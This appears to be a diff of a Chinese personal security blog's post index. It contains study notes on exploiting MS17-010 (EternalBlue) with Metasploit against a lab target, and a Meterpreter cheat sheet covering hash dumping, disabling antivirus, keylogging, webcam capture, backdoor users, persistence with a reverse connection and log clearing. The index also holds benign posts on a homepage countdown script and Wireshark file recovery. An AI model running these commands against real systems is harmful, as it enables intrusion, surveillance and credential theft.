+<p><img src="https://img.anineg.space/2.png" alt="2"></p>
+<p>ms17-010代码 msf6 &gt; <code>search ms17_010</code></p>
+<p><img src="https://img.anineg.space/3.png" alt="3"></p>
+<p>在这里可以看到两个工具，其中auxiliary/scanner/smb/smb_ms17_010是永恒之蓝扫描模块,探测主机是否存在MS17_010漏洞，exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码，前者扫描漏洞，后者进行攻击。</p>
+<h2 id="使用ms17-010扫描模块"><a href="#使用ms17-010扫描模块" class="headerlink" title="使用ms17-010扫描模块"></a>使用ms17-010扫描模块</h2><p>msf6 &gt; <code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
+<p>查看模块需要配置的参数  <code>show options</code></p>
+<p><img src="https://img.anineg.space/4.png" alt="4"></p>
+<p>在Required一栏中显示yes的需要填写Current Setting项</p>
+<p>如 <code>set rhosts 192.168.8.172</code></p>
+<p>执行扫描 <code>run</code></p>
+<p><img src="https://img.anineg.space/5.png" alt="5"></p>
+<p>显示可能存有永恒之蓝漏洞。</p>
+<h2 id="使用ms17-010攻击模块"><a href="#使用ms17-010攻击模块" class="headerlink" title="使用ms17-010攻击模块"></a>使用ms17-010攻击模块</h2><p>msf6 &gt; <code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
+<p>查看模块需要配置的参数  <code>show options</code></p>
+<p><img src="https://img.anineg.space/6.png" alt="6"></p>
+<p>同理，设置目标IP ：<code>set rhosts 192.168.8.172</code></p>
+<p>设置用于接收从目标机弹回来的shell：<code>set  LHOST 192.168.1.11</code></p>
+<p>执行攻击 <code>run</code></p>
+<p><img src="https://img.anineg.space/7.png" alt="7"></p>
+<center>攻击成功！</center>
+
+<hr>
+<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>使用<code>shell</code>可以进入被攻击机的Windows shell，但会有乱码。使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页）即恢复正常。</p>
+<p><img src="https://img.anineg.space/8.png" alt="8"></p>
+<p>使用<code>screenshot</code>进行截屏</p>
+<p><img src="https://img.anineg.space/9.png" alt="9"></p>
+<p>想从目标主机shell退出到 meterpreter ，输入：<code>exit</code></p>
+<p>要想从 meterpreter 退出到MSF框架，输入：<code>background</code></p>
+<h2 id="更多操作"><a href="#更多操作" class="headerlink" title="更多操作"></a>更多操作</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run				             #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接</span><br><span class="line">                                   192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line">clearev                       #清除日志</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br></pre></td></tr></tbody></table></figure>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+        <tag>渗透</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2022/9/10，来自广西桂林</title>
+    <url>/2022/09/10/letter1/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="5eb2e4208aeee67215fd846a934f80c87190f17dc4ddec3794ff3c6acd11b829">79a05bc0503f79b89e0f5d9d72ac99970a53cf5cc16a923d1fc10be8557a7b1b87500effd05fda921309daef9f384740aef8cabd2054be0688fbbce86eac7bfb09ca1050f29b0e50585192a55f1410def10f9bad245828601948dcd89d37d22901453e7e4a8215cdd9ac31d6d811a3374d3a169571134e0b7fb3e4ea07a38681e6e9e7ee2e20127c7524d345fe1ca864726f5362fcc86352b0aca0ab42568489ee14e14f4c035650fcf78d90beb0a85f81be36acb2e902ffc9e6e953c2ea97dd9b2cd2be750040a2c266426da2b51d3deeda99321cc76bb529066bc7bda9ca13f41621986b2e63b2148717ced5254a5965464a0c284260edf9fac2253fc26fb0f42453776fc5f0113a3a1419580acce51f3e31cff82867a84adada4cb1200c025257c44c2e2a2d7758ee3c4dd18e8d703de4e94f77ae22fcb5c3f8f65aa84acc8b59dbda94f7eb7d5c830789b654f860feb5d8cc0bdb55a9dd5a6677acf6def4efc62ed1f74894457eb64030f20e575ca09e74fa74dab305ddbfe8c75a3e8ee8d9bcf2f216bcb011625a548cfd524d1d7ee720f40485af33912de6256a178aa2af3ed86647f876dc054b8581b53a1fdc791ff24101912f22b69bb4592812349b278adb486cee00acf0ba35137c1620507cbb3a7273e0a7bbf2ee798f1ffef7cb7d17f81e77d47c12e76018414c98068c2d2e1fe49b70f1963ed804fdb4e05f654ada9bd3a1ccc545d8c53876401f807fbbddaae0f2f678571a83fd0d2c0866bc1387fec52535190bce521d32e11c89d547ec098fb8933f4b8c1e34ba6f7cef62c9e2c9e56f8c67bcef84d3dd54f65d38a3752ff24017dd99183fc4330d9c8dbc16c9647d5a3a9d93f66a41716854244cedc6a4223c8850f67abdcd482d1452489b54e0d07a906007426fc7ff2a52cbb5a737ec51261cd7a981b430f0be14417758579f6b22cdc4577942f2028a5407a8b8054d0cd1d3444795abcd3c55ebb6d3e55d238dbc9c1640d3154abb627a2863df2bb9b884437b80e4d8b8dda41676d65c67a2229d1d308193f572b55a4ce02f2f3ac50642e8c7a5b9b1d7cc75cfd74ed17a609ad505e23e9b4bf75606492bcfe2e883347116037f5f4488e9f92710778ed7690ad797f53aebc7a5e1e21e6013611b1181b476ecfe536c4364eed1b5adc3232265ffe8e388d5c028b160177272961fb45b3497aceb2c977be597513244d8768423d1deb3f8e002da9373e518160d5d5d86d398cc00fd35a2aeb96d702a3180c0e239c3861306e86c18a387899e11e18a503f1f07c3ec27d3361fa8c0789aa6fce70940286fa3fa01b48f981e52381f1f9314fad958e06429cf0e129253fd62a84c27e630e3f0cece6add23bfd22af9da84803bc018d1fd247f86d96ec99ed551eed42ef8106cb6b60f216eb528e895884d34777af1bf0fe888e06be9a57732e1af07d8c896a484d97767feb0eeb06024686287348f65a7c0ab14bec0669db12614cb5af5286a993382b99789ebc38c83945ac183466f9bed378d773b52152a631cbcd49eedb8eec1a43c09d0a1a18e7aaaba3d5e24f2fb84bc7ee70c54adf2bd1b78ca50bf15a83bdc77c12b2b6d995e413ac7aae36b3a2ed56cdc996cad7a762919e4316766c8ee1ba53d871996121fe075972e629d85919fd21b1b1eca16c16c5eed3d82817dfc124a7b988ccf6ddf1a7c45afc3947e7438105c9a4db6a7f50e585b560fea60d048424384db80403da772e0dc29d1c560f71e343461d93f09209f3963edc168ff8717c259480dab591d94f666cd6c61cc9295b151a22e7305f04fea86a3f60a81350c0573c0a9e07d4a69cc02b714f33c38fa87fd63d15308bf83817ee554df04912f771eb16bc961d394c3efca134b9e6865e199c9b12332e8d23981972dfe5a2f6911f37c844965b3e88039e768d842c6d20a5b174cececa91ea534b77709956561a5bf5650caba3c495917d368922d1677dad06f0190c12205e0a83a99c6c3f657fbfaff4cbdf413651dde0cfe4cbaaf22867cdaa7cfae3a8de1dd137c761be3b67fbf0536e36c6031349653af04d9e1ac27e670bcd0bb863f91249a79a5850d593677465460a0f69477e4d6a6b28972cee39b81965add31b4b0e2d1de53e889d879419b0b5f8f1dfa7ee71290906c7f7a133f15a31230ea98e4b1262a52d2b1524b35edf82c061c94d07e742139018e16c6b38258ca3211c01d96929c4752e72b5240a056f8df50678e0218940d40b1d9c085443be49b2b76d07c120cd942eb85ceb24bfce582d6b0adeb2d005d46e63ae07370ed9e29d153840b72a5c1a6d0c31ac9b76151b6192ceddadfa3531c2c2af8f8039c9482977a7d3172e5fc569cd0b37e796f14835baffcf0120e2799b90c61f8a47ba5fd57646913cbad30334629ccab3c7dd210f1a60412dc4e9f3369e6c90f5d63553fd216858f9fc0c6383f5abbac129a6a574331e1b0965b8e1450145bdffd40542ef7e2db5974d114fdaddd428f69530268fafba8ef11ebc4cfb89e2e468acaffc3cfa34eb487dfae8de7ebfc824cf86ed910a3d432d363a89d493e36bc59810e63170c351882491118a6004f966f916be73038da66c762e23a166c2a75eef0dbe07c683e717c73b02bae79b942aae0eb51de83605a8d6a48f5b13183d0ed8b525cd5c1e85a7e4731675930540956cd0728a11f13ed64a6a4b3b34643007f9f4687cb179a13689df951b7d5e07ac7229d3f1b5f452c44ba728932d088b35c1606cf184b3b1c562017e2ab79f205fa9d74e0ca1d1db641d6379c23d79a9ce56570c2238772eaabea31f03625fe2c89008b27901260816835ddb837e734a03b84c8c82b81d8dcb6619082a7481c9195202aeb34a832d479cd2789d532877b0b1d1680ff8a3f6a00b554f2ede7557212f12bbd25389eb383edd7f0bfd25dd9e69f175404f94f4257cb22557a45a790fee861bea1e1142d702ea1fd6294db8fee01d7663f45d777872ced3906f806998888830a3c474693200f49d2a4b7ead027018b267fa8e46826e94aebc386eb1aad9515b51af1d90f1a43a1bc4f4f40912068d20ef61f91753f5d01d1bc7cd898f41c1edd7453f3aa25faf1db2313cea66d04d0a1972072b58df097fd558e87a542328d88fca98cc305f886731d94f492fc92e752e389c28660f6b539c2ca02d0cd5cf7e520a5e6993ab206dae0f923f69659167910d6c915abb54a5729d348926df69e7f053c9464b40fba6b9d9d19e7de648aae668e7d9afa83c543c6d84b1ade7022411c35500233ffa7829b8b125b55ba2bc8d22c6d480945aa1c77ea02bc6d16b39fa21067c58de5aa8e905bdd2554f6a63b4e3133a5815d97973abc5d38c8772f72d6a6add25f039852df5aac737c0b0a37ea352f5df178b5f2f2dc4f36f2f292355941acc7bb32fe0abb5e04309889da54ac107145e484c24a644d8c5cc44a36569e453a9977629c56d289e114efa1f32025dfb3e71f3fec5d8668647cad8d943aca034720e604c21eb69ac5431ef9132390d816117f906ed5f3a4d78b51891414280dce82de75cb933a7c08101fde25f322ef6233f7af6203dbaf9561c63e1c152d28a2d14be3dbc7052d63ec3a410444fb5b81de961405281de41e9245c10b05fc7e8d31ac21e761c0217f94b57fc50043be3f8c8964df71ad6a4b98f2a50d25f880c61107d270db270c612e73c60a79da612cd920db9aefe0ffe6ed9f7a8fe476d425cb832c161298fd7ec6c2e9349af6484a28a4fbf887d69441f96aeacb6a7ce9c22545c4d905b7f4611c9a8c838ddead90e6b9f5777d9e2c03fd7bc2ccaeafd842f5834f12e2e2379c58bd3ad233eab93732595cd48fba789dd546b58c0757c8646c116eefb356cea86af006cb360ef1a126ada0152847ba5028b5b1237e1f637f220413ea4bf437102238</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-up">
+      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，密码在明信片上哦</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+  </entry>
+  <entry>
+    <title>主页源码修改记录（简单网页倒计时+跳转+文本替换）</title>
+    <url>/2023/04/14/indexcode/</url>
+    <content><![CDATA[<h1 id="网站模板"><a href="#网站模板" class="headerlink" title="网站模板"></a>网站模板</h1><p>我的主页(<a href="https://anineg.space)模板是使用的来自">https://anineg.space)模板是使用的来自</a> <a href="https://html5up.net">https://html5up.net</a> 的免费模板，以下是网页的介绍：</p>
+<ul>
+<li>Fully <strong>Responsive</strong></li>
+<li>Built on intelligent <strong>HTML5 + CSS3</strong></li>
+<li>Super <strong>Customizable</strong></li>
+<li><strong>100% Free</strong> under the <a href="https://html5up.net/license">Creative Commons</a></li>
+</ul>
+<p>有需要的同学们可以去自行下载。</p>
+<p><img src="https://img.anineg.space/myindex.png" alt=""></p>
+<h1 id="源码修改"><a href="#源码修改" class="headerlink" title="源码修改"></a>源码修改</h1><p>在原有模板的基础上，我增添了如下功能：</p>
+<ol>
+<li>它会在页面上显示10秒倒计时，结束后后自动跳转到博客页。</li>
+<li>在倒计时这10秒中可以对博客网页进行预加载。</li>
+<li>当用户单击网页任何位置时，倒计时停止，并将显示倒计时的文本替换为“欢迎访问ANINEG的小屋”</li>
+</ol>
+<p>以下是实现过程：</p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> preloadUrl = <span class="string">"https://blog.anineg.space/"</span>; <span class="comment">// 需要预加载的页面地址</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">"iframe"</span>); <span class="comment">// 创建一个iframe元素</span></span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">"none"</span>; <span class="comment">// 将iframe元素隐藏</span></span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">src</span> = preloadUrl; <span class="comment">// 设置预加载页面的地址</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe); <span class="comment">// 将iframe元素添加到body中，开始预加载</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> count = <span class="number">13</span>; <span class="comment">// 设置倒计时时间</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> intervalId = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">        count--;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown"</span>).<span class="property">innerHTML</span> = count; <span class="comment">// 更新倒计时数字</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (count &lt;= <span class="number">0</span>) {</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">clearInterval</span>(intervalId); <span class="comment">// 清除计时器</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown-text"</span>).<span class="property">innerHTML</span> = <span class="string">"欢迎访问ANINEG的小屋"</span>; <span class="comment">// 替换倒计时提示为“欢迎访问”</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">"https://blog.anineg.space/"</span>; <span class="comment">// 跳转到下一个页面</span></span></span><br><span class="line"><span class="language-javascript">        }</span></span><br><span class="line"><span class="language-javascript">    }, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">"click"</span>, <span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">clearInterval</span>(intervalId); <span class="comment">// 清除计时器</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown-text"</span>).<span class="property">innerHTML</span> = <span class="string">"欢迎访问ANINEG的小屋"</span>; <span class="comment">// 替换倒计时提示为“欢迎访问”</span></span></span><br><span class="line"><span class="language-javascript">    });</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"countdown-text"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"countdown"</span>&gt;</span>13<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 秒后自动前往博客页···<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<p>实际上，该模板的入场动画大概耗费3秒左右，因此需要10秒自动跳转的效果就需要将预设调为13秒。</p>
+<p>在预加载部分，在倒计时开始时，使用JavaScript动态创建一个<code>&lt;iframe&gt;</code>元素，并将需要预加载的页面设置为该<code>&lt;iframe&gt;</code>的<code>src</code>属性。这样，浏览器就会在倒计时期间开始预加载该页面，从而提高用户体验。</p>
+<p>接着，我们创建了一个计时器，每秒减少计数器变量<code>count</code>的值，并更新页面上的倒计时数字。当<code>count</code>的值减少到0时，清除计时器并跳转到下一个页面。最后，在页面上添加了一个事件监听器，当用户单击页面上的任何位置时，清除计时器，停止倒计时。</p>
+<p>最后，我们在页面中添加了一个<code>&lt;p&gt;</code>元素，并将其<code>id</code>属性设置为<code>"countdown-text"</code>，用于显示倒计时提示或替换后的新文本。在计时器停止时，我们使用JavaScript修改了该元素的文本内容，将倒计时提示替换为需要显示的新文本。同时在单击事件监听器中补充添加了一行代码，用于在停止计时器时替换倒计时提示为“欢迎访问”文本。这样，无论是计时器正常结束还是被单击事件停止，都会显示“欢迎访问”文本。</p>
+]]></content>
+      <categories>
+        <category>随手记</category>
+      </categories>
+      <tags>
+        <tag>源码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>某神奇社团的招新视频~</title>
+    <url>/2022/07/29/ladybug/</url>
+    <content><![CDATA[<div class="tip "><p>Tips：如有背景音乐自动播放，可以在左下角弹窗内关闭。</p>
+</div>
+<div align="center" class="aspect-ratio">
+    <iframe src="https://player.bilibili.com/player.html?aid=216487398&amp;&amp;page=1&amp;as_wide=1&amp;high_quality=1&amp;danmaku=0" scrolling="no" border="0" frameborder="no" framespacing="0" high_quality="1" danmaku="1" allowfullscreen="true"> 
+    </iframe>
+</div>
+]]></content>
+      <categories>
+        <category>视频</category>
+      </categories>
+      <tags>
+        <tag>bilibili</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>反弹Shell:通过Excel表格进行远控</title>
     <url>/2023/04/02/officevba/</url>
     <content><![CDATA[<h1 id="讲在前面"><a href="#讲在前面" class="headerlink" title="讲在前面"></a>讲在前面</h1><p>很久没有更新啦，自从12月新冠开始再加上过年和开学考试<del>再加上亿点点的划水</del>，不知不觉就过去这么久了。那么今天刚好开完了社团的分享会，也一起在这里更新一下内容，也算是作为这次分享的记录了。</p>
@@ -843,6 +942,46 @@
         <tag>靶机</tag>
         <tag>渗透</tag>
         <tag>分享会</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TCP协议传输数据还原测试</title>
+    <url>/2022/10/04/tcptest/</url>
+    <content><![CDATA[<details class="folding-tag" yellow=""><summary> 相关原理： </summary>
+              <div class="content">
+              <p>TCP（Transmission Control Protocol，传输控制协议）是基于连接的协议，也就是说，在正式收发数据前，必须和对方建立可靠的连接。一个TCP连接必须要经过三次“对话”才能建立起来，其中的过程非常复杂，我们这里只做简单、形象的介绍，你只要做到能够理解这个过程即可。我们来看看这三次对话的简单过程：主机A向主机B发出连接请求数据包：“我想给你发数据，可以吗？”，这是第一次对话；主机B向主机A发送同意连接和要求同步（同步就是两台主机一个在发送，一个在接收，协调工作）的数据包：“可以，你什么时候发？”，这是第二次对话；主机A再发出一个数据包确认主机B的要求同步：“我现在就发，你接着吧！”，这是第三次对话。三次“对话”的目的是使数据包的发送和接收同步，经过三次“对话”之后，主机A才向主机B正式发送数据。</p><p>QQ的文件发送是怎样的过程呢？通常，发送文件的计算机首先要通过消息服务器将其IP地址发送给接收计算机，当接收计算机同意接收的确认消息反馈到消息服务器后，消息服务器将据此设置好文件传输对话。随即，发送计算机与接收计算机就会在确定好的端口范围内，建立起TCP或UDP连接开始文件的检索与传输。</p><p>在默认状态下，QQ优先采用了UDP（User Data Protocol，用户数据报协议）协议传送数据，而对可靠性要求高的数据通讯系统往往使用TCP协议传输数据。与TCP协议不同，UDP协议并不提供数据传送的验证机制——在整个文件传输过程中如果出现数据报的丢失，协议本身并不能作出任何的检测或提示。因此，通常人们把UDP协议称为不可靠的传输协议。 UDP协议适用于无须应答、要求时效的软件使用，这样的设计正好与QQ追求的目标相符，所以QQ优先使用了此协议进行一切功能应用。但是，由于UDP协议具有不可靠性，常会因种种原因导致消息或数据的发送失败（很多时候会发现发送文件给对方接收时，对方根本收不到要求接收文件的消息。或是发送聊天消息时，对方根本没有收到过消息）。显然，UDP协议由于排除了信息可靠传递机制，将安全和排序等功能移交给上层应用来完成，极大降低了执行时间，使速度得到了保证。QQ在数据传输上更注重实际性能，为了获得更好的使用效果，往往可以牺牲一定的可靠性。因此，使用QQ来传输数据，在很多时候就成了一个“不错”的选择。（来自互联网）</p>
+              </div>
+            </details>
+<h1 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h1><p>将手机与电脑连接至同一局域网中。</p>
+<ul>
+<li><p>手机IP:<code>192.168.31.216</code></p>
+<p><img src="https://img.anineg.space/3454545.png" alt="Screenshot_20221004_140105"></p>
+</li>
+<li><p>电脑IP:<code>192.168.31.182</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004140012.png" alt="QQ截图20221004140012"></p>
+</li>
+</ul>
+<h1 id="Wireshark抓包"><a href="#Wireshark抓包" class="headerlink" title="Wireshark抓包"></a>Wireshark抓包</h1><p>启动WireShark，选择WLAN过滤器：</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004132831.png" alt="QQ截图20221004132831"></p>
+<p>在过滤器中输入：<code>ip.src == 192.168.31.216</code>以捕获/过滤指定ip地址（手机）数据包。</p>
+<p><img src="https://img.anineg.space/12345664556.png" alt="12345664556"></p>
+<p>此时，我们在手机上发送一张图片给电脑，我们可以看到Wireshark捕获了大量数据包。其中这一项就是我们刚刚发送的图片：</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135150.png" alt="QQ截图20221004135150"></p>
+<p>右键，选择“追踪流=&gt;TCP流”</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135442.png" alt="QQ截图20221004135442"></p>
+<p>数据格式选择“原始数据”，然后将其另存为新文件。</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135514.png" alt="QQ截图20221004135514"></p>
+<h1 id="数据还原"><a href="#数据还原" class="headerlink" title="数据还原"></a>数据还原</h1><p>使用16进制编辑器（如WinHex）打开文件，找到jpg格式图片的文件头<code>FF D8 FF</code>,并把文件头前面的数据删除：</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135748.png" alt="QQ截图20221004135748"></p>
+<p>保存后，将文件后缀改为<code>.jpg</code>，至此，文件得以还原：</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135901.png" alt="QQ截图20221004135901"></p>
+<div class="tag link"><a class="link-card" title="文件头标识及对应类型表" href="https://anineg.space/2022/07/10/yinxie2/#文件头标识及对应类型表："><div class="left"><img src="https://anineg.space/img/favicon.png"></div><div class="right"><p class="text">文件头标识及对应类型表</p><p class="url">https://anineg.space/2022/07/10/yinxie2/#文件头标识及对应类型表：</p></div></a></div>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>Wireshark</tag>
       </tags>
   </entry>
   <entry>
@@ -903,20 +1042,59 @@
       </categories>
   </entry>
   <entry>
-    <title>2022/9/10，来自广西桂林</title>
-    <url>/2022/09/10/letter1/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="5eb2e4208aeee67215fd846a934f80c87190f17dc4ddec3794ff3c6acd11b829">79a05bc0503f79b89e0f5d9d72ac99970a53cf5cc16a923d1fc10be8557a7b1b87500effd05fda921309daef9f384740aef8cabd2054be0688fbbce86eac7bfb09ca1050f29b0e50585192a55f1410def10f9bad245828601948dcd89d37d22901453e7e4a8215cdd9ac31d6d811a3374d3a169571134e0b7fb3e4ea07a38681e6e9e7ee2e20127c7524d345fe1ca864726f5362fcc86352b0aca0ab42568489ee14e14f4c035650fcf78d90beb0a85f81be36acb2e902ffc9e6e953c2ea97dd9b2cd2be750040a2c266426da2b51d3deeda99321cc76bb529066bc7bda9ca13f41621986b2e63b2148717ced5254a5965464a0c284260edf9fac2253fc26fb0f42453776fc5f0113a3a1419580acce51f3e31cff82867a84adada4cb1200c025257c44c2e2a2d7758ee3c4dd18e8d703de4e94f77ae22fcb5c3f8f65aa84acc8b59dbda94f7eb7d5c830789b654f860feb5d8cc0bdb55a9dd5a6677acf6def4efc62ed1f74894457eb64030f20e575ca09e74fa74dab305ddbfe8c75a3e8ee8d9bcf2f216bcb011625a548cfd524d1d7ee720f40485af33912de6256a178aa2af3ed86647f876dc054b8581b53a1fdc791ff24101912f22b69bb4592812349b278adb486cee00acf0ba35137c1620507cbb3a7273e0a7bbf2ee798f1ffef7cb7d17f81e77d47c12e76018414c98068c2d2e1fe49b70f1963ed804fdb4e05f654ada9bd3a1ccc545d8c53876401f807fbbddaae0f2f678571a83fd0d2c0866bc1387fec52535190bce521d32e11c89d547ec098fb8933f4b8c1e34ba6f7cef62c9e2c9e56f8c67bcef84d3dd54f65d38a3752ff24017dd99183fc4330d9c8dbc16c9647d5a3a9d93f66a41716854244cedc6a4223c8850f67abdcd482d1452489b54e0d07a906007426fc7ff2a52cbb5a737ec51261cd7a981b430f0be14417758579f6b22cdc4577942f2028a5407a8b8054d0cd1d3444795abcd3c55ebb6d3e55d238dbc9c1640d3154abb627a2863df2bb9b884437b80e4d8b8dda41676d65c67a2229d1d308193f572b55a4ce02f2f3ac50642e8c7a5b9b1d7cc75cfd74ed17a609ad505e23e9b4bf75606492bcfe2e883347116037f5f4488e9f92710778ed7690ad797f53aebc7a5e1e21e6013611b1181b476ecfe536c4364eed1b5adc3232265ffe8e388d5c028b160177272961fb45b3497aceb2c977be597513244d8768423d1deb3f8e002da9373e518160d5d5d86d398cc00fd35a2aeb96d702a3180c0e239c3861306e86c18a387899e11e18a503f1f07c3ec27d3361fa8c0789aa6fce70940286fa3fa01b48f981e52381f1f9314fad958e06429cf0e129253fd62a84c27e630e3f0cece6add23bfd22af9da84803bc018d1fd247f86d96ec99ed551eed42ef8106cb6b60f216eb528e895884d34777af1bf0fe888e06be9a57732e1af07d8c896a484d97767feb0eeb06024686287348f65a7c0ab14bec0669db12614cb5af5286a993382b99789ebc38c83945ac183466f9bed378d773b52152a631cbcd49eedb8eec1a43c09d0a1a18e7aaaba3d5e24f2fb84bc7ee70c54adf2bd1b78ca50bf15a83bdc77c12b2b6d995e413ac7aae36b3a2ed56cdc996cad7a762919e4316766c8ee1ba53d871996121fe075972e629d85919fd21b1b1eca16c16c5eed3d82817dfc124a7b988ccf6ddf1a7c45afc3947e7438105c9a4db6a7f50e585b560fea60d048424384db80403da772e0dc29d1c560f71e343461d93f09209f3963edc168ff8717c259480dab591d94f666cd6c61cc9295b151a22e7305f04fea86a3f60a81350c0573c0a9e07